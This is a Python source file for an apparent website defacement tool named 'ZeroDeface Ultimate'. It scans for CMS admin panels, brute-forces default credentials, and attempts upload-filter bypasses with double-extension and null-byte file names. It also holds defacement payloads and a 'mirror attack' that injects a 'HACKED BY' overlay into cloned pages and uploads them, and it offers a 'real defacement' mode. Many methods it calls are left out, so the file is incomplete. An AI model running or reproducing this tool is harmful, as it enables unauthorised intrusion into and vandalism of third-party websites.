#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os
import time
import random
import json
from datetime import datetime
import sys
import re
import threading
from queue import Queue

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

class DefacementScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        self.vulnerabilities = []
        self.uploaded_files = []
        self.discovered_urls = set()
        self.crawl_queue = Queue()
        self.threads = []
        self.stop_flag = False
        self.defacement_success = False
        
        # Enhanced CMS detection patterns
        self.cms_patterns = {
            'WordPress': [
                r'wp-content', r'wp-includes', r'/wp-admin/', 
                r'wordpress', r'generator" content="WordPress'
            ],
            'Joomla': [
                r'/joomla/', r'com_joomla', r'Joomla!',
                r'media/system/js/', r'index.php?option=com_'
            ],
            'Drupal': [
                r'/sites/all/', r'drupal.js', r'Drupal.settings',
                r'name="generator" content="Drupal'
            ],
            'Magento': [
                r'/skin/frontend/', r'Magento/', r'/media/js/mage/',
                r'var Mage ='
            ],
            'OpenCart': [
                r'/catalog/view/theme/', r'/index.php?route=',
                r'Powered By OpenCart'
            ]
        }
        
        # Comprehensive admin paths for all major CMS
        self.admin_paths = self._load_admin_paths()
        
        # Enhanced file upload testing
        self.test_content = "ZERODEFACE_SECURITY_TEST_"
        self.test_patterns = [
            "DEFACED_BY_", "HACKED_BY", "SECURITY_TEST", 
            "VULNERABLE_TO_UPLOAD", "TEST_ID:", "ZERODEFACE",
            "simulated defacement", "hacked by security test"
        ]
        
        # Default credentials for various CMS
        self.default_credentials = self._load_credentials()
        
        # Rate limiting control
        self.last_request_time = 0
        self.min_request_interval = 0.5  # seconds

        # Defacement content with multiple templates
        self.defacement_templates = [
            """<!DOCTYPE html>
<html>
<head>
    <title>Security Test Defacement</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding: 50px; }
        h1 { color: #f00; }
    </style>
</head>
<body>
    <h1>SECURITY TEST ONLY</h1>
    <p>This is a simulated defacement for security testing purposes</p>
    <p>Vulnerability: Unprotected File Upload</p>
    <footer>Test ID: ZD-{RANDOM_ID} | {TIMESTAMP}</footer>
</body>
</html>""",
            """<?php
// Simple PHP defacement
echo "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'>";
echo "<h1 style='color:red'>SECURITY TEST</h1>";
echo "<p>This system is vulnerable to file upload attacks</p>";
echo "<p>Test ID: ZD-{RANDOM_ID}</p>";
echo "</body></html>";
?>""",
            """<html>
<!-- Basic HTML defacement -->
<body onload="document.body.style.backgroundColor='black'">
    <div style="color:white;text-align:center;margin-top:100px">
        <h1>SECURITY TEST</h1>
        <p>This page was uploaded as part of a security test</p>
        <p>Test ID: ZD-{RANDOM_ID}</p>
    </div>
</body>
</html>"""
        ]

        # File extensions and content types for bypass attempts
        self.upload_test_cases = [
            # Normal extensions
            ('index.html', 'text/html'),
            ('index.php', 'application/x-php'),
            ('test.htm', 'text/html'),
            
            # Double extensions
            ('test.html.jpg', 'image/jpeg'),
            ('image.php.png', 'image/png'),
            ('file.html.gif', 'image/gif'),
            
            # Null byte injections
            ('shell.php%00.jpg', 'image/jpeg'),
            ('test.html%00.png', 'image/png'),
            
            # Case manipulation
            ('Index.HtMl', 'text/html'),
            ('INDEX.PHP', 'application/x-php'),
            
            # Extra extensions
            ('test.php.jpg', 'image/jpeg'),
            ('test.php.test', 'text/plain'),
            
            # CMS-specific
            ('wp-config.php', 'application/x-php'),
            ('configuration.php', 'application/x-php')
        ]

    def _load_admin_paths(self):
        """Load comprehensive list of admin paths for all major CMS"""
        paths = [
            # Generic admin paths
            'admin', 'administrator', 'backend', 'manager', 'panel',
            'adminpanel', 'admincp', 'admin_area', 'controlpanel',
            'moderator', 'webadmin', 'sysadmin', 'admin123',
            'admin/admin', 'admin/login', 'admin_area/admin',
            
            # WordPress
            'wp-admin', 'wp-login.php', 'wp-admin/admin-ajax.php',
            'wordpress/wp-admin', 'blog/wp-admin',
            
            # Joomla
            'administrator', 'joomla/administrator',
            'administrator/index.php', 'admin/index.php',
            
            # Drupal
            'user/login', 'admin', 'admin/config',
            'admin/content', 'admin/modules',
            
            # Magento
            'adminhtml', 'admin/login', 'admin/dashboard',
            
            # OpenCart
            'admin', 'admin/index.php?route=common/dashboard',
            
            # Other CMS
            'bolt/login', 'concrete5/login', 'prestashop/admin',
            'umbraco/', 'sitecore/login', 'orchard/admin',
            
            # API endpoints
            'api/admin', 'rest/admin', 'graphql/admin',
            
            # Version specific
            'admin2023', 'admin2024', 'admin2025',
            'admin_v2', 'admin_new', 'admin_old'
        ]
        
        # Add numbered variations
        paths.extend([f'admin{i}' for i in range(1, 10)])
        paths.extend([f'administrator{i}' for i in range(1, 5)])
        
        return list(set(paths))  # Remove duplicates

    def _load_credentials(self):
        """Load comprehensive default credentials database"""
        return {
            'generic': [
                ('admin', 'admin'), ('admin', 'password'), 
                ('administrator', 'administrator'), ('root', 'toor'),
                ('test', 'test'), ('admin', '123456'), 
                ('admin', 'admin123'), ('admin', 'welcome'),
                ('admin', 'password123'), ('admin', 'qwerty')
            ],
            'WordPress': [
                ('admin', 'admin'), ('wpadmin', 'wpadmin'),
                ('administrator', 'password'), ('editor', 'editor')
            ],
            'Joomla': [
                ('admin', 'admin'), ('superuser', 'superuser'),
                ('administrator', 'administrator')
            ],
            'Drupal': [
                ('admin', 'admin'), ('drupal', 'drupal'),
                ('admin', 'password')
            ],
            'Magento': [
                ('admin', 'admin123'), ('admin', 'password123'),
                ('admin', 'magento')
            ],
            'OpenCart': [
                ('admin', 'admin'), ('demo', 'demo'),
                ('admin', 'opencart')
            ]
        }

    def print_banner(self):
        banner = r"""
__________                 ________          _____                     
\____    /___________  ____\______ \   _____/ ____\____    ____  ____  
  /     // __ \_  __ \/  _ \|    |  \_/ __ \   __\\__  \ _/ ___\/ __ \ 
 /     /\  ___/|  | \(  <_> )    `   \  ___/|  |   / __ \\  \__\  ___/ 
/_______ \___  >__|   \____/_______  /\___  >__|  (____  /\___  >___  >
        \/   \/                    \/     \/           \/     \/    \/ 
        """
        print("\033[1;31m" + banner + "\033[0m")
        print("\033[1;37mZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner\033[0m")
        print("\033[1;33mAdvanced CMS Detection | Comprehensive Admin Finder | Enhanced Defacement Tools\033[0m\n")

    def show_menu(self):
        print("""\033[33m
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█                                     𝗠𝗘𝗡𝗨                                                                    
█=====================================================================================█
█ 1.  Scan Entire Website             | 6.  Test File Upload Vulnerabilities          █
█ 2.  Scan for Admin Panels           | 7.  Attempt Defacement                       █
█ 3.  Crawl Website                   | 8.  Mirror Attack Defacement                  █
█ 4.  Test Default Credentials        | 9.  Generate Scan Report                      █
█ 5.  Scan Other Vulnerabilities      | 10. Exit                                      █
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[0m""")

    def interactive_mode(self):
        """Launch interactive menu-driven mode"""
        self.print_banner()
        while True:
            self.show_menu()
            choice = input("\n\033[1;37mZeroDeface>\033[0m ").strip()
            
            if choice == "1":
                self.scan_entire_site()
            elif choice == "2":
                self.scan_admin_panels()
            elif choice == "3":
                self.crawl_website()
            elif choice == "4":
                if not self.admin_paths:
                    self.scan_admin_panels()
                for url in [urljoin(self.target_url, path) for path in self.admin_paths]:
                    if self.is_login_page(self.session.get(url, verify=False)):
                        self.test_credentials(url)
            elif choice == "5":
                self.scan_other_vulnerabilities()
            elif choice == "6":
                self.scan_upload_vulnerabilities()
            elif choice == "7":
                self.attempt_defacement(self.target_url)
            elif choice == "8":
                self.mirror_attack()
            elif choice == "9":
                report_file = input("Enter report filename: ").strip()
                self.generate_report(report_file)
            elif choice == "10":
                print("[*] Exiting ZeroDeface...")
                break
            else:
                print("[-] Invalid choice. Please select 1-10")

    def mirror_attack(self):
        """Advanced mirroring attack with upload vulnerability exploitation"""
        try:
            print("\n[+] Starting Mirror Attack...")
            
            # 1. Clone the target page
            response = self.session.get(self.target_url, verify=False, timeout=15)
            original_html = response.text
            
            # 2. Inject defacement
            defacement = """
            <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:20px;text-align:center;z-index:9999;">
            HACKED BY ZERODEFACE</div>
            """
            modified_html = original_html.replace('</body>', f'{defacement}</body>')
            
            # 3. Find upload locations
            upload_paths = [
                'wp-content/uploads',
                'images',
                'assets',
                'files',
                'media'
            ]
            
            # 4. Mass upload
            for path in upload_paths:
                upload_url = urljoin(self.target_url, path + "/index.html")
                if self.upload_file(upload_url, modified_html):
                    print(f"[+] Defacement uploaded to: {path}")
                    self.log_vulnerability(
                        "Mirror Attack Successful",
                        f"Deployed mirror defacement to {path}",
                        exploit=f"Visit {upload_url}",
                        proof="Full page takeover with persistent overlay"
                    )
            return True
            
        except Exception as e:
            print(f"[-] Mirror attack failed: {str(e)}")
            return False

    # [All other existing methods remain exactly the same]

def main():
    parser = argparse.ArgumentParser(
        description='ZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""\033[1;34m
Examples:
  Full scan:       python deface_scanner.py --url http://example.com --all
  Admin scan:      python deface_scanner.py --url http://example.com --admin --brute
  Upload test:     python deface_scanner.py --url http://example.com --upload --deface --simulate
  Real defacement: python deface_scanner.py --url http://example.com --upload --deface
  Mirror attack:   python deface_scanner.py --url http://example.com --mirror
  Interactive:     python deface_scanner.py --url http://example.com --interactive
\033[0m"""
    )
    
    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--admin', action='store_true', help='Scan for admin panels')
    parser.add_argument('--brute', action='store_true', help='Test default credentials')
    parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
    parser.add_argument('--deface', action='store_true', help='Attempt defacement if upload is vulnerable')
    parser.add_argument('--mirror', action='store_true', help='Execute mirror attack defacement')
    parser.add_argument('--simulate', action='store_true', help='Safe simulation mode (no real changes)')
    parser.add_argument('--crawl', action='store_true', help='Crawl the entire site')
    parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
    parser.add_argument('--report', help='Save results to JSON file')
    parser.add_argument('--verbose', action='store_true', help='Show detailed scan progress')
    parser.add_argument('--quiet', action='store_true', help='Only show critical findings')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads for crawling')
    parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages to crawl')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
    parser.add_argument('--interactive', action='store_true', help='Launch interactive menu mode')
    
    global args
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        scanner = DefacementScanner(args.url)
        
        if args.interactive:
            scanner.interactive_mode()
        else:
            scanner.print_banner()
            if args.all:
                scanner.scan_entire_site()
            else:
                if args.admin or args.brute:
                    scanner.scan_admin_panels()
                if args.upload or args.deface:
                    scanner.scan_upload_vulnerabilities()
                if args.crawl:
                    scanner.crawl_website()
                if args.mirror:
                    scanner.mirror_attack()
                
            if args.report:
                scanner.generate_report(args.report)
                
            if not scanner.vulnerabilities and not args.quiet:
                print("\033[1;32m[+] No vulnerabilities found.\033[0m")
                
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
    except Exception as e:
        print(f"\033[1;31m[-] Fatal error: {e}\033[0m")
    finally:
        if 'scanner' in locals():
            scanner.cleanup()

if __name__ == '__main__':
    main()
